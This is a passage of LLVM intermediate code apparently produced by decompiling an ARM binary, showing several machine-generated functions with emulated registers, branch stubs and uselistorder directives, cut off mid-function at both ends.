  br label %dec_label_pc_111d4

dec_label_pc_111d4:                               ; preds = %dec_label_pc_11194, %dec_label_pc_111c4
  %v0_111d4 = load i32, i32* %ip.global-to-local, align 4
  %v3_111d8 = icmp ult i32 %v0_111d4, 131070
  br i1 %v3_111d8, label %dec_label_pc_11244, label %dec_label_pc_111dc

dec_label_pc_111dc:                               ; preds = %dec_label_pc_111d4
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_111e0 = load i32, i32* @r7, align 4
  %v2_111e0 = add i32 %v0_111e0, 32
  %v3_111e0 = inttoptr i32 %v2_111e0 to i32*
  %v4_111e0 = load i32, i32* %v3_111e0, align 4
  store i32 %v4_111e0, i32* @r4, align 4
  %v1_111e4 = inttoptr i32 %v4_111e0 to i32*
  %v2_111e4 = load i32, i32* %v1_111e4, align 4
  store i32 %v2_111e4, i32* %r3.global-to-local, align 4
  %v1_111e8 = and i32 %v2_111e4, 2
  %v2_111e8 = icmp eq i32 %v1_111e8, 0
  br i1 %v2_111e8, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_111dc
  store i32 %v4_111e0, i32* %r0.global-to-local, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_111dc, %bb
  store i32 70132, i32* @lr, align 4
  %v1_111f0 = xor i1 %v2_111e8, true
  call void @__pseudo_cond_branch(i1 %v1_111f0, i32 ptrtoint (i32* @global_var_10e94.444 to i32))
  %v0_111f4 = load i32, i32* @r4, align 4
  %v1_111f4 = add i32 %v0_111f4, 44
  %v2_111f4 = inttoptr i32 %v1_111f4 to i32*
  %v3_111f4 = load i32, i32* %v2_111f4, align 4
  store i32 %v3_111f4, i32* %r3.global-to-local, align 4
  %v1_111f8 = add i32 %v3_111f4, 4
  %v2_111f8 = inttoptr i32 %v1_111f8 to i32*
  %v3_111f8 = load i32, i32* %v2_111f8, align 4
  store i32 %v3_111f8, i32* %r3.global-to-local, align 4
  %v1_111fc = add i32 %v0_111f4, 836
  %v2_111fc = inttoptr i32 %v1_111fc to i32*
  %v3_111fc = load i32, i32* %v2_111fc, align 4
  store i32 %v3_111fc, i32* %r2.global-to-local, align 4
  %v1_11200 = and i32 %v3_111f8, -4
  store i32 %v1_11200, i32* %r3.global-to-local, align 4
  %v3_11204 = icmp ult i32 %v1_11200, %v3_111fc
  br i1 %v3_11204, label %dec_label_pc_11244, label %dec_label_pc_1120c

dec_label_pc_1120c:                               ; preds = %bb15
  store i32 %v0_111f4, i32* %r1.global-to-local, align 4
  %v1_11210 = add i32 %v0_111f4, 840
  %v2_11210 = inttoptr i32 %v1_11210 to i32*
  %v3_11210 = load i32, i32* %v2_11210, align 4
  store i32 %v3_11210, i32* %r0.global-to-local, align 4
  %v2_11214 = call i32 @function_10de4(i32 %v3_11210, i32 %v0_111f4)
  store i32 %v2_11214, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11244

dec_label_pc_1121c:                               ; preds = %dec_label_pc_110e0
  %v2_1121c = inttoptr i32 %v1_110b0 to i32*
  %v3_1121c = load i32, i32* %v2_1121c, align 4
  store i32 %v3_1121c, i32* %r0.global-to-local, align 4
  %v1_11220 = add i32 %v4_110a0, 848
  %v2_11220 = inttoptr i32 %v1_11220 to i32*
  %v3_11220 = load i32, i32* %v2_11220, align 4
  store i32 %v3_11220, i32* %r2.global-to-local, align 4
  %v1_11224 = add i32 %v4_110a0, 868
  %v2_11224 = inttoptr i32 %v1_11224 to i32*
  %v3_11224 = load i32, i32* %v2_11224, align 4
  %v2_11228 = add i32 %v3_1121c, %v1_110ac
  store i32 %v2_11228, i32* %r1.global-to-local, align 4
  %v1_1122c = add i32 %v3_11220, -1
  store i32 %v1_1122c, i32* %r2.global-to-local, align 4
  %v2_11230 = sub i32 %v3_11224, %v2_11228
  store i32 %v2_11230, i32* %r3.global-to-local, align 4
  store i32 %v2_11230, i32* %v2_11224, align 4
  %v1_11238 = load i32, i32* @lr, align 4
  %v2_11238 = add i32 %v1_11238, 848
  %v3_11238 = inttoptr i32 %v2_11238 to i32*
  store i32 %v1_1122c, i32* %v3_11238, align 4
  %v0_1123c = load i32, i32* %r0.global-to-local, align 4
  %v1_1123c = load i32, i32* @r5, align 4
  %v2_1123c = sub i32 %v1_1123c, %v0_1123c
  store i32 %v2_1123c, i32* %r0.global-to-local, align 4
  %v4_11240 = call i32 @function_12de4(i32 %v2_1123c, i32 %v2_11228, i32 %v1_1122c, i32 %v2_11230)
  store i32 %v4_11240, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11244

dec_label_pc_11244:                               ; preds = %bb15, %dec_label_pc_111d4, %dec_label_pc_1120c, %dec_label_pc_110c0, %dec_label_pc_1121c
  store i32 %v2_11054, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_11250 = load i32, i32* @r7, align 4
  %v2_11250 = add i32 %v0_11250, 24
  %v3_11250 = inttoptr i32 %v2_11250 to i32*
  %v4_11250 = load i32, i32* %v3_11250, align 4
  store i32 %v4_11250, i32* @ip, align 4
  store i32 70236, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11250)
  br label %dec_label_pc_1125c

dec_label_pc_1125c:                               ; preds = %dec_label_pc_11048, %dec_label_pc_11244
  store i32 %v3_11048, i32* @r4, align 4
  store i32 %v6_11048, i32* @r5, align 4
  store i32 %v9_11048, i32* @r6, align 4
  store i32 %v12_11048, i32* @r7, align 4
  store i32 %v18_11048, i32* @lr, align 4
  ret i32 %v2_11054

; uselistorder directives
  uselistorder i32 %v0_111f4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_111b4, { 1, 0 }
  uselistorder i32 %v1_110f4, { 1, 0 }
  uselistorder i32 %v0_110f4, { 1, 0 }
  uselistorder i32 %v3_110c8, { 1, 0 }
  uselistorder i32 %v1_110ac, { 1, 0, 2 }
  uselistorder i32 %v2_110a8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_110a0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11050, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 5, 1, 2, 3, 4, 0, 6, 7, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_1125c, { 1, 0 }
  uselistorder label %dec_label_pc_11244, { 4, 2, 0, 1, 3 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_111d4, { 1, 0 }
  uselistorder label %dec_label_pc_11194, { 1, 0 }
  uselistorder label %dec_label_pc_11188, { 1, 0 }
  uselistorder label %dec_label_pc_11184, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11138, { 1, 0 }
}

define i32 @function_1126c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1126c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_1126c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1126c, label %bb, label %dec_label_pc_1126c..thread4_crit_edge

dec_label_pc_1126c..thread4_crit_edge:            ; preds = %dec_label_pc_1126c
  %v0_11298.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_1126c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1126c..thread4_crit_edge, %bb
  %v0_11298 = phi i32 [ %v0_11298.pre, %dec_label_pc_1126c..thread4_crit_edge ], [ 0, %bb ]
  %v3_11284 = load i32, i32* @r4, align 4
  store i32 %v3_11284, i32* %stack_var_-12, align 4
  %v6_11284 = load i32, i32* @r5, align 4
  %v9_11284 = load i32, i32* @lr, align 4
  %v4_11294 = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_11294, i32* @r5, align 4
  store i32 %v0_11298, i32* @r4, align 4
  store i32 %v4_11294, i32* @r0, align 4
  %v0_112a4 = call i32 @function_10e94()
  %v0_112a8 = load i32, i32* @r4, align 4
  store i32 %v0_112a8, i32* %r0.global-to-local, align 4
  %v0_112ac = load i32, i32* @r5, align 4
  %v2_112b4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_112b4, i32* @r4, align 4
  store i32 %v6_11284, i32* @r5, align 4
  store i32 %v9_11284, i32* @lr, align 4
  %v3_112b8 = call i32 @function_10de4(i32 %v0_112a8, i32 %v0_112ac)
  store i32 %v3_112b8, i32* %r0.global-to-local, align 4
  %v0_112bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_112bc, label %bb12, label %.thread5

bb12:                                             ; preds = %.thread4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread4, %bb12
  %v4_112c0 = phi i32 [ %v3_112b8, %.thread4 ], [ 0, %bb12 ]
  ret i32 %v4_112c0

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 (i32, i32)* @function_10de4, { 1, 0 }
  uselistorder i32 ()* @function_10e94, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 142996 to i32*), { 17, 2, 1, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 3 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_112c4() local_unnamed_addr {
dec_label_pc_112c4:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 142964, i32* @r5, align 4
  %v4_112dc = load i32, i32* inttoptr (i32 142980 to i32*), align 4
  store i32 70376, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_112dc)
  %v2_112f8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v6_11304 = call i32 @function_12eec(i32 1, i32 %v2_112f8, i32 0, i32 32, i32 32, i32 0)
  %v4_1130c = load i32, i32* @global_var_25850.452, align 4
  %v2_11310 = icmp eq i32 %v4_1130c, 0
  br i1 %v2_11310, label %dec_label_pc_11318, label %dec_label_pc_11358

dec_label_pc_11318:                               ; preds = %dec_label_pc_112c4
  store i32 1, i32* @global_var_25850.452, align 4
  br label %dec_label_pc_11320

dec_label_pc_11320:                               ; preds = %dec_label_pc_11368, %dec_label_pc_11318
  %v0_11324 = load i32, i32* @r5, align 4
  %v2_11324 = add i32 %v0_11324, 684
  store i32 %v2_11324, i32* @r4, align 4
  %v2_11330 = add i32 %v0_11324, 36
  %v3_11330 = inttoptr i32 %v2_11330 to i32*
  %v4_11330 = load i32, i32* %v3_11330, align 4
  call void @__pseudo_branch(i32 %v4_11330)
  %v1_11340 = call i32 @function_1007c(i32 6)
  %v0_1134c = load i32, i32* @r5, align 4
  %v2_1134c = add i32 %v0_1134c, 16
  %v3_1134c = inttoptr i32 %v2_1134c to i32*
  %v4_1134c = load i32, i32* %v3_1134c, align 4
  store i32 70488, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1134c)
  %v4_1135c.pre = load i32, i32* @global_var_25850.452, align 4
  br label %dec_label_pc_11358

dec_label_pc_11358:                               ; preds = %dec_label_pc_112c4, %dec_label_pc_11320
  %v0_1136c = phi i32 [ %v4_1130c, %dec_label_pc_112c4 ], [ %v4_1135c.pre, %dec_label_pc_11320 ]
  %v7_11360 = icmp eq i32 %v0_1136c, 1
  br i1 %v7_11360, label %dec_label_pc_11368, label %dec_label_pc_113a4

dec_label_pc_11368:                               ; preds = %dec_label_pc_11358
  %v2_11368 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_11368, i32* @r4, align 4
  store i32 2, i32* @global_var_25850.452, align 4
  store i32 20, i32* @r2, align 4
  %v2_11380 = bitcast i32* %stack_var_-28 to i8*
  %v3_11380 = call i32 @function_f5d0(i8* %v2_11380, i32 0)
  %v6_1139c = call i32 @function_129e0(i32 6, i32 %v2_11368, i32 0, i32 -1, i32 -1, i32 -1)
  br label %dec_label_pc_11320

dec_label_pc_113a4:                               ; preds = %dec_label_pc_11358
  %v7_113a4 = icmp eq i32 %v0_1136c, 2
  br i1 %v7_113a4, label %dec_label_pc_113ac, label %dec_label_pc_113b8

dec_label_pc_113ac:                               ; preds = %dec_label_pc_113a4
  store i32 3, i32* @global_var_25850.452, align 4
  %v0_113b4 = call i32 @function_112c4()
  %v4_113b8.pre = load i32, i32* @global_var_25850.452, align 4
  br label %dec_label_pc_113b8

dec_label_pc_113b8:                               ; preds = %dec_label_pc_113a4, %dec_label_pc_113ac
  %v1_113c0 = phi i32 [ %v0_1136c, %dec_label_pc_113a4 ], [ %v4_113b8.pre, %dec_label_pc_113ac ]
  %v7_113bc = icmp eq i32 %v1_113c0, 3
  br i1 %v7_113bc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_113b8
  store i32 4, i32* @global_var_25850.452, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_113b8, %bb
  call void @__pseudo_cond_branch(i1 %v7_113bc, i32 ptrtoint (i32* @global_var_12ec0.454 to i32))
  br label %dec_label_pc_113d0

dec_label_pc_113d0:                               ; preds = %dec_label_pc_113d0, %.thread1
  %v0_113d0 = call i32 @function_112c4()
  br label %dec_label_pc_113d0

; uselistorder directives
  uselistorder i32 ()* @function_112c4, { 1, 0, 5, 4, 6, 3, 2 }
  uselistorder i32* @global_var_25850.452, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32* inttoptr (i32 142980 to i32*), { 4, 0, 3, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_113b8, { 1, 0 }
  uselistorder label %dec_label_pc_11358, { 1, 0 }
}

define i32 @function_113dc(i64* %arg1) local_unnamed_addr {
dec_label_pc_113dc:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_113dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_113dc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_113dc
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_113dc, %bb
  %v4_113e8 = phi i32 [ %tmp, %dec_label_pc_113dc ], [ 0, %bb ]
  ret i32 %v4_113e8

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_113ec() local_unnamed_addr {
dec_label_pc_113ec:
  %v0_113f4 = call i32 @function_11404()
  ret i32 %v0_113f4
}

define i32 @function_11404() local_unnamed_addr {
dec_label_pc_11404:
  %stack_var_-20 = alloca i32, align 4
  %v3_11404 = load i32, i32* @r4, align 4
  store i32 142964, i32* @r4, align 4
  %v4_11434 = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  call void @__pseudo_branch(i32 %v4_11434)
  %v0_11448 = load i32, i32* @r4, align 4
  %v2_11448 = add i32 %v0_11448, 16
  %v3_11448 = inttoptr i32 %v2_11448 to i32*
  %v4_11448 = load i32, i32* %v3_11448, align 4
  store i32 ptrtoint (i32* @global_var_11454.460 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11448)
  %v2_11458 = ptrtoint i32* %stack_var_-20 to i32
  %v0_1145c = load i32, i32* @r4, align 4
  %v2_1145c = add i32 %v0_1145c, 860
  %v2_11460 = inttoptr i32 %v2_1145c to i32*
  %v3_11460 = call i32 @function_117a8(i32* %v2_11460, i32 %v2_11458)
  %v0_11470 = load i32, i32* @r4, align 4
  %v2_11470 = add i32 %v0_11470, 24
  %v3_11470 = inttoptr i32 %v2_11470 to i32*
  %v4_11470 = load i32, i32* %v3_11470, align 4
  store i32 %v4_11470, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_11470)
  %v3_1147c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_11404, i32* @r4, align 4
  ret i32 %v3_1147c
}

define i32 @function_11490(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11490:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_11490 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11490, label %bb, label %dec_label_pc_11490..thread4_crit_edge

dec_label_pc_11490..thread4_crit_edge:            ; preds = %dec_label_pc_11490
  %v0_114cc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_11490
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11490..thread4_crit_edge, %bb
  %v0_114cc = phi i32 [ %v0_114cc.pre, %dec_label_pc_11490..thread4_crit_edge ], [ 0, %bb ]
  store i32 142964, i32* @r6, align 4
  %v2_114bc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v0_114cc, i32* @r5, align 4
  store i32 %v2_114bc, i32* %r0.global-to-local, align 4
  %v4_114d8 = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  call void @__pseudo_branch(i32 %v4_114d8)
  store i32 143672, i32* %r0.global-to-local, align 4
  %v0_114ec = load i32, i32* @r6, align 4
  %v2_114ec = add i32 %v0_114ec, 16
  %v3_114ec = inttoptr i32 %v2_114ec to i32*
  %v4_114ec = load i32, i32* %v3_114ec, align 4
  store i32 70904, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_114ec)
  %v0_114fc = load i32, i32* @r6, align 4
  %v2_114fc = add i32 %v0_114fc, 860
  %v0_11504 = load i32, i32* @r5, align 4
  store i32 %v0_11504, i32* %r0.global-to-local, align 4
  %v1_11508 = add i32 %v0_114fc, 868
  %v2_11508 = inttoptr i32 %v1_11508 to i32*
  %v3_11508 = load i32, i32* %v2_11508, align 4
  store i32 %v3_11508, i32* @r4, align 4
  %v2_1150c = inttoptr i32 %v2_114fc to i32*
  %v3_1150c = call i32 @function_116c4(i32 %v0_11504, i32* %v2_1150c)
  %v1_11514 = icmp slt i32 %v3_1150c, 0
  store i32 %v2_114bc, i32* %r0.global-to-local, align 4
  %v3_11524 = load i32, i32* @r4, align 4
  %v4_11524 = add i32 %v3_11524, -4
  %storemerge = select i1 %v1_11514, i32 0, i32 %v4_11524
  %v1_11530 = call i32 @unknown_0()
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 0, 1 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_11548(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_11548:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_11548 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11548, label %bb, label %dec_label_pc_11548..thread4_crit_edge

dec_label_pc_11548..thread4_crit_edge:            ; preds = %dec_label_pc_11548
  %v0_1157c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_11548
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11548..thread4_crit_edge, %bb
  %v0_1157c = phi i32 [ %v0_1157c.pre, %dec_label_pc_11548..thread4_crit_edge ], [ 0, %bb ]
  %v6_11560 = load i32, i32* @r5, align 4
  store i32 142964, i32* @r4, align 4
  %v2_11574 = ptrtoint i32* %stack_var_-48 to i32
  store i32 143672, i32* %r5.global-to-local, align 4
  store i32 %v0_1157c, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %v2_11574, i32* %r0.global-to-local, align 4
  %v4_11598 = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  call void @__pseudo_branch(i32 %v4_11598)
  %v0_115a4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_115a4, i32* %r0.global-to-local, align 4
  %v0_115ac = load i32, i32* @r4, align 4
  %v2_115ac = add i32 %v0_115ac, 16
  %v3_115ac = inttoptr i32 %v2_115ac to i32*
  %v4_115ac = load i32, i32* %v3_115ac, align 4
  store i32 71096, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_115ac)
  %v0_115bc = load i32, i32* @r6, align 4
  %v0_115c0 = load i32, i32* @r4, align 4
  %v2_115c0 = add i32 %v0_115c0, 860
  %v0_115c4 = load i32, i32* @r7, align 4
  %v0_115c8 = load i32, i32* @sl, align 4
  store i32 %v0_115c8, i32* @r0, align 4
  %v1_115cc = add i32 %v0_115c0, 868
  %v2_115cc = inttoptr i32 %v1_115cc to i32*
  %v3_115cc = load i32, i32* %v2_115cc, align 4
  store i32 %v3_115cc, i32* @r5, align 4
  %v4_115d0 = inttoptr i32 %v0_115c8 to i32*
  %v5_115d0 = call i32 @function_11910(i32* %v4_115d0, i32 %v0_115bc, i32 %v0_115c4, i32 %v2_115c0)
  store i32 %v2_11574, i32* %r0.global-to-local, align 4
  %v0_115e0 = load i32, i32* @r4, align 4
  %v2_115e0 = add i32 %v0_115e0, 24
  %v3_115e0 = inttoptr i32 %v2_115e0 to i32*
  %v4_115e0 = load i32, i32* %v3_115e0, align 4
  call void @__pseudo_branch(i32 %v4_115e0)
  %v0_115ec = load i32, i32* @r5, align 4
  %v1_115ec = add i32 %v0_115ec, -4
  store i32 %v1_115ec, i32* %r0.global-to-local, align 4
  store i32 %v6_11560, i32* %r5.global-to-local, align 4
  ret i32 %v1_115ec

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 868, { 0, 1, 4, 2, 3, 5, 6, 7 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_11608(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11608:
  %v0_11608 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11608, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_11608
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11608, %bb
  %v10_1161c = phi i32 [ %arg1, %dec_label_pc_11608 ], [ 0, %bb ]
  ret i32 %v10_1161c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_11620(i32 %arg1) local_unnamed_addr {
dec_label_pc_11620:
  %stack_var_-40 = alloca i32, align 4
  %v3_11620 = load i32, i32* @r4, align 4
  %v6_11620 = load i32, i32* @r5, align 4
  %v9_11620 = load i32, i32* @r6, align 4
  %v15_11620 = load i32, i32* @lr, align 4
  store i32 142964, i32* @r4, align 4
  %v2_11634 = ptrtoint i32* %stack_var_-40 to i32
  store i32 143672, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_11650 = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  call void @__pseudo_branch(i32 %v4_11650)
  %v0_11664 = load i32, i32* @r4, align 4
  %v2_11664 = add i32 %v0_11664, 16
  %v3_11664 = inttoptr i32 %v2_11664 to i32*
  %v4_11664 = load i32, i32* %v3_11664, align 4
  store i32 71280, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11664)
  %v0_11674 = load i32, i32* @r6, align 4
  store i32 %v0_11674, i32* @r0, align 4
  %v0_11678 = load i32, i32* @r4, align 4
  %v2_11678 = add i32 %v0_11678, 860
  %v2_1167c = inttoptr i32 %v0_11674 to i32*
  %v3_1167c = call i32 @function_11838(i32* %v2_1167c, i32 %v2_11678)
  %v0_11690 = load i32, i32* @r4, align 4
  %v2_11690 = add i32 %v0_11690, 24
  %v3_11690 = inttoptr i32 %v2_11690 to i32*
  %v4_11690 = load i32, i32* %v3_11690, align 4
  call void @__pseudo_branch(i32 %v4_11690)
  store i32 %v3_11620, i32* @r4, align 4
  store i32 %v6_11620, i32* @r5, align 4
  store i32 %v9_11620, i32* @r6, align 4
  store i32 %v15_11620, i32* @lr, align 4
  ret i32 %v2_11634

; uselistorder directives
  uselistorder i32 860, { 0, 1, 2, 3, 6, 5, 4, 7 }
  uselistorder i32 143672, { 1, 2, 0 }
}

define i32 @function_116ac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_116ac:
  %v0_116ac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_116ac, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_116ac
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_116ac, %bb
  %v10_116c0 = phi i32 [ %arg1, %dec_label_pc_116ac ], [ 0, %bb ]
  ret i32 %v10_116c0

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_116c4(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_116c4:
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_116c4 = load i32, i32* @r4, align 4
  store i32 %v3_116c4, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r4, align 4
  %v1_116cc = add i32 %tmp, 12
  %v2_116cc = inttoptr i32 %v1_116cc to i8*
  %v3_116cc = load i8, i8* %v2_116cc, align 1
  %v2_116d0 = icmp eq i8 %v3_116cc, 0
  br i1 %v2_116d0, label %.thread5, label %.thread6

.thread5:                                         ; preds = %dec_label_pc_116c4
  %v4_116cc = zext i8 %v3_116cc to i32
  %v1_116d811 = add i32 %arg1, 4
  store i32 %v1_116d811, i32* %r6.global-to-local, align 4
  %v1_116dc12 = add i32 %tmp, 8
  %v2_116dc13 = inttoptr i32 %v1_116dc12 to i32*
  %v3_116dc14 = load i32, i32* %v2_116dc13, align 4
  %v3_116f8 = add i32 %v3_116dc14, -4
  %v4_116f8 = inttoptr i32 %v3_116f8 to i32*
  store i32 %v4_116cc, i32* %v4_116f8, align 4
  br label %dec_label_pc_11784

.thread6:                                         ; preds = %dec_label_pc_116c4
  %v2_116d4 = add i32 %tmp, 4
  %v3_116d4 = inttoptr i32 %v2_116d4 to i32*
  %v4_116d4 = load i32, i32* %v3_116d4, align 4
  %v1_116d8 = add i32 %arg1, 4
  store i32 %v1_116d8, i32* %r6.global-to-local, align 4
  %v1_116dc = add i32 %tmp, 8
  %v2_116dc = inttoptr i32 %v1_116dc to i32*
  %v3_116dc = load i32, i32* %v2_116dc, align 4
  %v3_116e4 = sub i32 %v4_116d4, %v3_116dc
  %v4_116e8 = sdiv i32 %v3_116e4, 4
  %v4_116ec = sext i8 %v3_116cc to i32
  %v4_116f4 = mul i32 %v4_116e8, 5
  %v5_116f4 = add i32 %v4_116f4, %v4_116ec
  %v3_116fc = add i32 %v3_116dc, -4
  %v4_116fc = inttoptr i32 %v3_116fc to i32*
  store i32 %v5_116f4, i32* %v4_116fc, align 4
  br label %dec_label_pc_11784

dec_label_pc_11784:                               ; preds = %.thread5, %.thread6
  %v0_11704 = load i32, i32* %r6.global-to-local, align 4
  %v1_11704 = add i32 %v0_11704, -4
  %v2_11704 = inttoptr i32 %v1_11704 to i32*
  %v3_11704 = load i32, i32* %v2_11704, align 4
  %v3_1170c = call i32 @function_cd70(i32 %v3_11704, i32 5)
  %v0_11784 = call i32 @function_d0ec()
  %v2_1178c = inttoptr i32 %v0_11784 to i32*
  store i32 22, i32* %v2_1178c, align 4
  %v2_11798 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11798, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i8 %v3_116cc, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_11784, { 1, 0 }
}

define i32 @function_117a8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_117a8:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_117a8 = load i32, i32* @r4, align 4
  store i32 %v3_117a8, i32* %stack_var_-8, align 4
  %v1_117ac = add i32 %tmp, 12
  %v2_117ac = inttoptr i32 %v1_117ac to i8*
  %v3_117ac = load i8, i8* %v2_117ac, align 1
  %v4_117ac = sext i8 %v3_117ac to i32
  store i32 %v4_117ac, i32* %r3.global-to-local, align 4
  %v2_117b0 = icmp eq i8 %v3_117ac, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_117bc = add i32 %tmp, 8
  %v2_117bc = inttoptr i32 %v1_117bc to i32*
  %v3_117bc = load i32, i32* %v2_117bc, align 4
  store i32 %v3_117bc, i32* %lr.global-to-local, align 4
  br i1 %v2_117b0, label %dec_label_pc_117c4, label %dec_label_pc_117e8

dec_label_pc_117c4:                               ; preds = %dec_label_pc_117a8
  %v1_117c4 = inttoptr i32 %v3_117bc to i32*
